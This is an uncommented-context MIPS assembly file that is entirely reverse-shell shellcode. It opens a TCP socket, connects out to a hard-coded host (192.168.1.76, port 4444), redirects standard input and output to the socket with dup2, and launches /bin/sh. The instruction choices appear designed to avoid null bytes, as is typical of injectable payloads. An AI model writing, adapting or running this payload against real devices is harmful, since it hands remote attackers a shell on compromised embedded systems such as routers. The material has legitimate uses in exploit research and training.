.section .text
.global __start

__start:
    # socket(AF_INET, SOCK_STREAM, 0) (2, 1, 0)
    
    slti $a2, $zero, -1
    xor $a0, $zero, 0x1337
    xor $a1, $a0, 0x1335
    xor $a0, $a0, 0x1335

    li $v0, 4183
    syscall 0x040405

    sw $v0, -0x14($sp)

    # connect(sockfd, &saddr, 0x10)
    lw $a0, -0x14($sp)

    lui $t1, 0x1002 # sizeof(sockaddr_in) + AF_INET 
    ori $t1, 0x115c # Port: 4444
    sw $t1, -0x10($sp)

    li $t3, 0xc0a8014c # IP address: 192.168.1.76
    sw $t3, -0xc($sp)

    lbu $a2, -0x10($sp)
    sb $zero, -0x10($sp)

    la $a1, -0x10($sp)

    li $v0, 4170 # SYS_connect
    syscall 0x040505

    # dup2(clientfd, [0, 1, 2])

    lw $a0, -0x14($sp)
    slti $a1, $zero, -1

    li $v0, 4063 # SYS_dup2
    syscall 0x040505

    slti $a1, $zero, 0x1337
    li $v0, 4063 # SYS_dup2
    syscall 0x040505

    # execve("/bin/sh", NULL, NULL)

    lui $t1, 0x2f62 # /b
    ori $t1, 0x696e # in
    lui $t3, 0x2f2f # //
    ori $t3, 0x7368 # sh

    sw $t1, -0x10($sp)
    sw $t3, -0xc($sp)
    sw $zero, -0x8($sp)

    slti $a1, $zero, -1
    slti $a2, $zero, -1

    la $a0, -0x10($sp)

    li $v0, 4011 # SYS_execve
    syscall 0x040405
